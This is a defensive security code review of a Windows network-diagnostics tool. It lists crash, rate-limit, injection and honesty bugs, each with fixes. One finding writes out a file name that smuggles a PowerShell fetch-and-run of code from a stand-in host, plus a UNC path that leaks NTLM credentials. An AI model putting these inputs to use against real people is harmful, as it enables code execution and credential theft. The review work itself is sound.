# 03 - User-input network tools: adversarial review (AdeeboMeter v1.1.4)

Scope: src/Checks/{DestCheck,Toolkit,Reach,Icmp,Online,Protocols,CertTools,SecChecks,Tools,MoreTools,Lab}.cs and
src/Ui/FullView.{Toolbox,Security,DeepTest}.cs. Static review, plus a mono harness
(`scratchpad/review/harnessA/`: `A.dll` = whole project, `h.cs` parser fuzz, `h2.cs` + `fake_iperf.py` iperf crash
repro, `h3.cs` binary-parser fuzz). "Confirmed (run)" = reproduced under mono; "Confirmed (read)" = certain from
the code plus documented .NET/Windows behaviour; "Suspected" = plausible, needs a Windows check.

Good news first (checked, held up): Remote/SSH copy-commands (`Reach.SafeHost/SafeUser`) are tight; every Toolbox run
is wrapped in a catch in `StartTool` (no crash from the tool's own thread); Stop keeps `tbBusy` true until the worker
really ends, so a second Lab run can't overlap; Lab count/gap caps are enforced in the sender, not the UI;
`Json.Parse` has a depth cap; SNMP/STUN/DNS binary parsers bound every index; HTTP request builder strips CR/LF from
header values and caps the body read at 64 KB; TLS checks never send data over an untrusted handshake.

---------------------------------------------------------------------------------------------------------------------

## CONFIRMED

### C1. HIGH - iperf3 UDP with a small `-l` kills the whole app (unhandled exception on a worker thread)
`src/Checks/Toolkit.cs:227-242` (worker thread in `IperfOne`), option parse at `:58`
```csharp
case "-l": ... { long r = size(v); if (r > 0) { o.Len = Math.Min(r, 1 << 20); i++; } break; }   // no lower bound
...
var buf = new byte[len]; ...
Be(buf, 0, (uint)sec); Be(buf, 4, (uint)us); Be(buf, 8, (uint)seq);   // needs len >= 12
...
catch (SocketException) { } catch (ObjectDisposedException) { }        // nothing else caught
```
Input: Toolbox > iperf3, Advanced = `-u -l 4` (any `-l` 1..11 with `-u`, upload direction), against any real iperf3
server. Once the test starts, each stream thread throws `IndexOutOfRangeException` on a bare `new Thread` - not inside
the `StartTool` try/catch - so the process terminates (`Crash.Write` then exit).
**Reproduced** with a fake iperf3 server (`fake_iperf.py`): mono prints `FATAL UNHANDLED EXCEPTION:
IndexOutOfRangeException at AdeeboMeter.Toolkit.Be ... <IperfOne>c__AnonStorey6`, exit code 1.
Same family: `-u -l 1M` -> every `s.Send` of a 1 MB datagram throws `SocketException(MessageSize)`, swallowed -> the
test "succeeds" with ~0 Mb/s and no error row (honesty).
Fix: clamp `len` for UDP to `12..65507` (TCP `1..1<<20`) in `ParseOpts`/`IperfOne`; wrap the whole thread body in
`catch (Exception)` and surface the error as a row.

### C2. MEDIUM - Traffic Lab UDP sender's 10 packets/s cap is bypassed against any closed port
`src/Checks/Lab.cs:134-143`
```csharp
var until = DateTime.UtcNow.AddMilliseconds(i == n - 1 ? 1000 : MinGapMs);
while (DateTime.UtcNow < until && !run.Stop)
{
    try { ... u.Receive(ref ep) ... }
    catch (SocketException e) { if (e.SocketErrorCode == SocketError.ConnectionReset) { refused++; break; } }
}
```
The 100 ms gap is enforced only by "keep receiving until `until`". On Windows a connected UDP socket gets
`WSAECONNRESET` on the next receive as soon as an ICMP port-unreachable comes back, and the `break` skips the rest of
the gap. Input: `udpsend`, target `10.0.0.5:9` (closed port), count 1000 -> 1000 packets at LAN RTT speed
(thousands/s), not 10/s. The UI text "Capped at 10 packets a second" is false for exactly the case people test most
(a closed port).
Fix: pace with an absolute schedule (`next = start + i*MinGapMs; Sleep(next-now)`) independent of the receive loop.

### C3. MEDIUM - Traffic Lab accepts broadcast / multicast / 0.0.0.0 as "one target"
`src/Checks/Lab.cs:47` (`Split`), `:80` (ICMP regex), `:131-136` (UDP), `MoreTools.cs:160` (ManyPorts)
```csharp
return host != "" && host.Length <= 253 && port >= 1 && port <= 65535 && Regex.IsMatch(host, @"^[\w.:%-]+$");
```
`255.255.255.255:9` passes (`harness: [255.255.255.255:9] -> True`). `UdpClient.Connect` special-cases the limited
broadcast address and sets `SO_BROADCAST` itself, so `udpsend` to `255.255.255.255:<port>` x 1000 delivers 1000
packets to every host on the LAN (combined with C2 at line rate if one host answers port-unreachable). Multicast
(`224.0.0.1`, `239.255.255.250:1900`) likewise reaches every listener; ICMP builder accepts `224.0.0.1`. The
section header promises "to one target ... never a flood".
Directed broadcast (`192.168.1.255:9`) fails with WSAEACCES, which is then reported as
**"port closed (the host said so)"** (`refused++` on any send `SocketException`, line 136/146) - wrong message.
Fix: after resolving, reject `IPAddress.Broadcast`, `Any/IPv6Any`, multicast (`224/4`, `ff00::/8`), the subnet's
directed broadcast, and `0.0.0.0/8`; count send errors separately from ICMP-unreachable.

### C4. MEDIUM - "Certificate commands" copy text: PowerShell injection via Unicode smart quotes
`src/Checks/CertTools.cs:301,313-319`
```csharp
static readonly char[] Unsafe = { '"', '\'', '`', '$', ';', '&', '|', '<', '>', '\r', '\n' };
...
string q = "\"" + f + "\"" ...  rows.Add(Cmd("Everything in it", "certutil -dump " + q, ...));
```
PowerShell treats U+201C/U+201D/U+201E as double quotes (and U+2018/2019 as single quotes); none are in `Unsafe` nor
in `Path.GetInvalidPathChars()`, and all are legal in NTFS file names. Input path:
`C:\certs\a” (calc) ”b.cer` (harness: accepted, emits `certutil -dump "C:\certs\a” (calc) ”b.cer"`). Pasted into
PowerShell (the row literally says "click to copy, then paste into PowerShell"), `”` closes the string and
`(calc)` is evaluated as an argument expression. A file shipped as `server” (iex(iwr evil.example)) ”.cer` turns
"Shift+right-click > Copy as path > Certificate commands > copy" into code execution. Same builder also accepts UNC
paths (`\\attacker\s\x.cer` -> `certutil -urlfetch` leaks NTLM).
Fix: whitelist instead of blacklist (`^[A-Za-z]:\\[\w\\ .()-]+$` minus parentheses, or reject anything outside
printable ASCII and `(){}@#,`), or emit single-quoted strings with `'` doubled after rejecting all quote-like
Unicode (`\p{Pi}\p{Pf}` + U+201E/U+201A); refuse `\\` paths here as `Input()` already does.

### C5. MEDIUM - Security checkup bypasses the company-network gate (DHCP request) and probes the router without one
`src/Checks/SecChecks.cs:408`
```csharp
var opts = Lab.DhcpOptions(m, "yes");   // hard-coded tick
```
"A second DHCP server" calls the Traffic Lab DHCP sender with the confirmation forced to "yes", so on a domain/VPN PC
it sends a DHCP information request that the Toolbox would refuse without the tick. `RouterAdmin`/`RouterOld`
(`:432,:443`) TCP-probe 80, 443, 21, 23, 7547, 8080, 22 on `m.Gateway` - which on an office LAN is the company's
router - with no gate either, while `sweep` and every Lab tool require it. The page copy says "Reads settings only".
Fix: pass the real tick (`Lab.Allowed`) or skip these three checks with "needs your OK on a company network"; reword
"Reads settings only" to "reads settings and asks your router a few questions".

### C6. MEDIUM - Honesty: user-added interception roots in the MACHINE store are never flagged
`src/Checks/SecChecks.cs:216-223`
```csharp
var extra = mine.Where(c => !lm.Contains(c.Thumbprint)).ToList();
var hits  = extra.Where(c => Interceptors.Any(...)).ToList();
... extra.Count == 0 ? One(0, "Trusted root certificates", "only the ones Windows and your company put there", ...)
```
Only CurrentUser-only roots are examined. Superfish, Kaspersky/Avast/ESET web shields, Fiddler "trust for all users",
mitmproxy installed by an admin, and most adware put their root in **LocalMachine\Root** -> green "only the ones
Windows and your company put there". The interceptor name list is never applied to LM roots.
Fix: run the `Interceptors` match over LM roots too (level 1, or 3 when `Company(m)`), and drop the claim about who
put them there.

### C7. MEDIUM - Honesty: "Saved Wi-Fi networks" reports green on non-English Windows
`src/Checks/SecChecks.cs:328-337`
```csharp
if (o == null || !o.Contains(":")) return One(3, ...);
var names = Regex.Matches(o, @"(?m)^\s+[^:\r\n]*Profile\s*:\s*(.+?)\s*$")...
... Regex.IsMatch(p, @"Authentication\s*:\s*Open") && Regex.IsMatch(p, @"Connection mode\s*:\s*Connect automatically")
```
`netsh wlan` output is localised (de: "Profil für alle Benutzer", "Authentifizierung", "Verbindungsmodus"). The
English regex finds nothing, the output still contains ':' -> `One(0, ..., "0 saved · none open and auto-joining")`
- a green all-clear that was never checked. Also read with `Encoding.Default` while netsh writes the OEM code page
(non-ASCII SSIDs mangled, then `name="..."` lookup fails silently).
Fix: when `names.Count == 0` but output is non-empty return level 3 "couldn't read"; prefer the WLAN API
(`WlanGetProfileList`/`WlanGetProfile` XML) over parsing localised text.

### C8. MEDIUM - HTTP request builder can hang indefinitely and ignores Stop
`src/Checks/Reach.cs:32,65`
```csharp
q.Timeout = 15000; q.ReadWriteTimeout = 15000;
... while (buf.Length < 65536 && (k = s.Read(b, 0, b.Length)) > 0) buf.Write(b, 0, k);
```
`ReadWriteTimeout` is per read. A slow-loris server that sends 1 byte every 14 s keeps the loop alive for up to 65,536
reads (~10 days). `Reach.Http` takes no `Run`, so Stop does nothing and the Toolbox stays "busy" (every other tool is
locked out until restart). Same pattern, bounded but long: `Protocols.Mail` (see C9).
Fix: one overall deadline (e.g. 30 s) checked in the loop and a `Run` parameter; abort the request on Stop.

### C9. MEDIUM - Mail tool: unbounded line/line-count reads from the server (memory blow-up / hang)
`src/Checks/Protocols.cs:184,188,199`
```csharp
string banner = rd.ReadLine() ?? "";
while ((l = rd.ReadLine()) != null) { caps.Add(...); if (l.Length < 4 || l[3] != '-') break; }
```
A hostile/odd server on 25/587 that streams bytes without CRLF makes `ReadLine` grow a string until OOM (each read
returns data, so the 8 s `ReadTimeout` never fires); one that sends endless `250-x` lines grows `caps` forever. No
overall deadline, Stop not honoured. The user only has to type the server name.
Fix: own bounded line reader (e.g. 4 KB/line, 50 lines, 15 s total).

### C10. MEDIUM - URL input breaks every ping/trace tool (`Icmp.Resolve4`)
`src/Checks/Icmp.cs:100-101`
```csharp
int c = h.LastIndexOf(':'); if (c > 0 && h.IndexOf(':') == c) h = h.Substring(0, c);   // runs first
if (h.StartsWith("http", ...)) { Uri u; if (Uri.TryCreate(h, ...)) h = u.Host; }
```
`https://example.com` has exactly one ':' so it is cut to `https` before the URL branch (harness: `host becomes
[https]`), then `DestCheck.Parse("https")` accepts it as a host name and DNS fails -> "couldn't find
https://example.com (IPv4)". Affects mtu, mtr, ret, owners, ping, dscp, bufferbloat target. Since the shared target
box carries over from `http`/`httptime`/`proxy` (which want URLs), users hit this constantly.
Fix: do the `Uri` branch before the port strip.

### C11. LOW-MEDIUM - "HTTP and TLS inspector" says TLS 1.3 "not offered" when it's this PC that can't
`src/Checks/Toolkit.cs:635-646`
```csharp
foreach (var proto in new[] { Tuple.Create("TLS 1.3", (SslProtocols)12288), ... })
... catch (Exception e) { rows.Add(R(3, proto.Item1, ... "not offered (" + ... + ")" ...)); }
```
On Windows 10 (SChannel has no TLS 1.3 client) the handshake always fails client-side and every site is reported as
"TLS 1.3 not offered". `DestCheck.Tls13Client()` already knows this; Toolkit doesn't use it.
Fix: skip/label "this PC can't test TLS 1.3" when `!Tls13Client()`.

### C12. LOW-MEDIUM - dig: a server name is silently replaced by your own DNS
`src/Checks/Toolkit.cs:369`
```csharp
if (!IPAddress.TryParse(sv, out srv) && !IPAddress.TryParse((dns ?? "").Split(',')[0].Trim(), out srv)) { ...error... }
```
Server `dns.google`, `8.8.8.8:53`, `http://...` or a typo like `1.1.1.l` all fall through to the system resolver; the
Status row then says "from 192.168.1.1", easy to miss - user believes they compared resolvers. Fix: if the box is
non-empty and not an IP/DoH URL, error out (or resolve the name and say so).

### C13. LOW-MEDIUM - IDN / non-ASCII names are sent as '?' to DNS
`src/Checks/Toolkit.cs:442` (`Question`), `Reach.cs:125` (`DnsQ`), `MoreTools.cs:125` (DnsCompare regex `\w` lets
them in)
```csharp
var b = Encoding.ASCII.GetBytes(label);   // "bücher" -> "b?cher"
```
Harness: `bücher.de` -> wire label `b?cher`. dig / DNS compare report NXDOMAIN ("the name doesn't exist") for a name
that exists. DestCheck rejects `bücher.de` without a scheme but accepts `https://bücher.de` (uses `IdnHost`) -
inconsistent. Fix: `new IdnMapping().GetAscii(name)` before building the question; reject what fails.

### C14. LOW-MEDIUM - "Hash a file and compare" false "DOESN'T MATCH - file damaged"
`src/Checks/CertTools.cs:128`
```csharp
want = new string((expected ?? "").Where(Uri.IsHexDigit).ToArray()).ToUpperInvariant();
```
Pasting the common forms `SHA256: e3b0...` or certutil's own `SHA256 hash of f.txt: e3b0...` keeps the hex letters
of the words (`A`,`2`,`5`,`6`,`a`,`f`...) -> red "DOESN'T MATCH ... The file is damaged". Harness reproduces with an
empty file and its correct SHA-256. Fix: extract `[0-9A-Fa-f]{32,128}` tokens and compare each.

### C15. LOW - Subnet calculator silently treats bad prefixes as /32
`src/Checks/Toolkit.cs:782-785`
```csharp
if (!int.TryParse(s.Substring(slash + 1), out prefix)) prefix = -2;   ... if (prefix < 0) prefix = bits;
```
Harness: `10.0.0.0/-1`, `10.0.0.0/abc`, `10.0.0.0/8 foo` -> "10.0.0.0/32 (one host)". Non-contiguous mask
`10.0.0.1 255.0.255.0` -> silently /8; IPv6 mask on IPv4 `10.0.0.1 ffff::` -> /16. Also IPv4 shorthand `1.2.3/24`
is taken as 1.2.0.3. Fix: only default to /32 when there is no prefix; error on parse failure, negative,
non-contiguous or wrong-family masks.

### C16. LOW - Scoped IPv6 literal with a port loses the port (DestCheck)
`src/Checks/DestCheck.cs:70-73`. Harness: `[fe80::1%12]:8443` -> host `[fe80::1%12]:8443`, **port 443**
(`m6` regex has no `%`, then `IPAddress.TryParse` accepts the bracketed form and ignores the port). Check runs
against the wrong port. Fix: allow `%[\w]+` in `m6`.

### C17. LOW - Other parsing/UX slips (all confirmed by harness or reading)
- `Toolkit.Http` / `Protocols.HttpTiming` (`Toolkit.cs:550`, `Protocols.cs:66`): `url.StartsWith("http")` -> any host
  that begins with "http" (`httpbin.org`, `http2.pro`, `httpstat.us`) is "not a web address". Use `Contains("://")`
  like `Reach.Http`.
- `Protocols.Split` (`Protocols.cs:31`): `host:abc` silently uses the default port (ssh/mail/ntp/radius/twamp...).
- JWT decoder (`CertTools.cs:283`): `exp` in milliseconds (13 digits) matches the first 11 digits -> "Expires
  2518-08-29" instead of flagging the bogus claim. Add `\b`/`(?!\d)`.
- DestCheck: `1.2.3`, `01.02.03.04`, `0x7f.1`, `4294967295`, `1` are accepted as IPs (Windows legacy parsing) and
  shown as typed; trailing-dot FQDN `example.com.` rejected; `Host:` header omits the non-default port and IPv6
  brackets (`DestCheck.cs:313`).
- ManyPorts (`MoreTools.cs:164`): `\d{1,5}` turns `100000` into port 10000; `1-65535` silently becomes ports 1 and
  65535 (fine as a non-scanner, but say "ranges aren't supported").
- `MoreTools.Rdp` (`:263`): any connect exception (host/network unreachable) is reported as "refused - the PC is
  there".
- HTTP request builder (`Reach.cs:34`): headers split on ';' -> `Content-Type: application/json; charset=utf-8` and
  multi-pair `Cookie:` are silently truncated (the remainder has no ':' and is dropped without being listed in
  "Not sent"). GET + body silently drops the body.
- `Toolkit.Query` TCP fallback (`Toolkit.cs:421-423`) lets `AggregateException` (connect refused) and `IOException`
  (read timeout) escape although callers treat `null` as "no answer": dig/DNS compare end as "Couldn't finish",
  security checks as "couldn't check - ...". Catch both and return null.
- `MoreTools.MySites` (`:207`): `a[0]` on an empty address list -> IndexOutOfRange -> whole tool "Couldn't finish".
- `MoreTools.Ldap`: `domainFunctionality` 10 (Server 2025) isn't mapped (array stops at index 8 = "2025", which is
  actually level 10); the read loop stops at the first 0x65 byte anywhere (the letter 'e'), so a split response is
  truncated.
- `Lab.DhcpOptions` never calls `DhcpCApiCleanup`; struct stride hard-coded to 32 is wrong on 32-bit Windows
  (`DHCPCAPI_PARAMS` is 20 bytes there) - build is AnyCPU, so x86 Windows 10 reads garbage.

### C18. LOW - DeepTest contradicts its own "never your company's servers" rule
`src/Ui/FullView.DeepTest.cs:69-76` + `MoreTools.cs:316`. Section 1 feeds `""` and `" "` into `ldapcheck`; `Ldap("")`
falls back to `%USERDNSDOMAIN%` -> LDAP rootDSE query plus TCP knocks on 636/3268/88 to the company DC, 2x. Hostile
names (`999.999.999.999`, `😀.example`) are also resolved through the company DNS by allips/dnscmp/shares
(`NetShareEnum(\\999.999.999.999)` triggers NetBIOS/LLMNR broadcasts). Add `ldapcheck`, `shares` to `ByHand` or
pre-fill box 0 with `127.0.0.1` for them.

---------------------------------------------------------------------------------------------------------------------

## SUSPECTED (need a Windows run)

### S1. MEDIUM - "Inspect a certificate" may write a private key to disk
`src/Checks/CertTools.cs:88` - `new X509Certificate2(b)` with default `X509KeyStorageFlags`. A raw DER blob that is
actually a PFX with an empty password (data[0]==0x30 passes `Blocks`) is imported with its key persisted to the user
key store (`%APPDATA%\Microsoft\Crypto\...`), contradicting "private keys are never ... written anywhere". Use
`new X509Certificate2(b, (string)null, EphemeralKeySet)` or reject PKCS#12 content-type before constructing.

### S2. LOW-MEDIUM - ICMP builder to broadcast/multicast
`Lab.Icmp` accepts `255.255.255.255` / `224.0.0.1`. On Windows `Ping.Send` to multicast gets replies from every host
(counted as one success each round) - again "one target" is not enforced. (Likely an error for 255.255.255.255.)

### S3. LOW - Mail/Revocation/Tls/X509Days use `new TcpClient()` + `ConnectAsync(string host)`
IPv4-family socket; IPv6-only hosts or `[::1]`-style targets may fail with an address-family error that is shown as
"not offered"/"couldn't connect". `Toolkit.Tls(u.Host...)` passes `[::1]` (with brackets) as a DNS name.

### S4. LOW - BitLocker shell property mapping
`SecChecks.cs:106-108` treats `System.Volume.BitLockerProtection` 5 as ON and 6 as OFF. Commonly documented values
are 1 on, 2 off, 3 encrypting, 4 decrypting, 5 "suspended/paused", 6 "on (locked)". If so, a suspended BitLocker
shows green and a locked data volume shows "OFF". Verify on a machine with `manage-bde -protectors -disable`.

### S5. LOW - Lab company guard is heuristic; failing open
`Lab.Company` = VPN detected OR primary DNS suffix OR UserDomainName != MachineName. An Intune/Entra-joined PC with a
local account on office Wi-Fi with a VPN AdeeboMeter doesn't recognise -> no tick needed. By design, but the UI should
say "we couldn't tell" rather than nothing. Not bypassable from input: the tick is read from the checkbox only for
`LabGate` tools, and `a[3]` cannot be typed by the user for those (they have at most 3 boxes).

### S6. LOW - Windows Update age parsed with the wrong culture
`SecChecks.cs:131`: `Win32_QuickFixEngineering.InstalledOn` is locale-formatted on some systems; Invariant parse is
tried first, so en-GB `3/11/2026` becomes 11 March -> wrong "days ago" (bounded by the `<= Now+1` guard only).

---------------------------------------------------------------------------------------------------------------------

## Checked and NOT a problem
- Random-byte fuzz (15,000 cases each, `h3.cs`) of `Reach.ParseStun`, `Protocols.ParseVarbinds`, `Toolkit.Parse`
  (DNS answers), `Lab.DhcpText` (options 1/15/43/51/119/121) and `MoreTools.ParseRootDse`: no exceptions.
- Process.Start with user input: none. The only user-influenced `Process.Start` calls are `explorer.exe /select,"<path>"`
  (path from a file the app just wrote, invalid-path-chars already rejected) and `SecFix` (whitelisted prefixes, URL
  re-parsed through `Uri`). netsh/schtasks are run with fixed args (SSIDs with '"' are skipped).
- Remote access copy-commands: `SafeHost` blocks spaces/quotes/leading '-' (trailing `\n` matches `$`, but input is
  trimmed first).
- Lab count (1..1000) and ICMP gap (>=100 ms) are clamped in `Lab`, not in the UI; options `size 70000`, `ttl 0/256`
  are refused; `size 0` works; odd/`zz` hex payload refused; >1400 bytes silently truncated (could say so).
- Window closed mid-send sets `Stop`; `BeginInvoke` after dispose is caught.
- Router checks use `m.Gateway` only; a user cannot point them at an arbitrary IP.
- Syslog facility/severity out of range -> clear error, nothing sent; text control chars stripped.
- Base64: whitespace, url-safe and missing padding all decode; JWT with 2/4 parts falls back to "not Base64".
- PFX wrong password -> "wrong password" (HRESULT check covers non-English messages); EphemeralKeySet used.
- Hash: 2 GB file streams in 1 MB blocks with Stop; locked file -> IOException row.
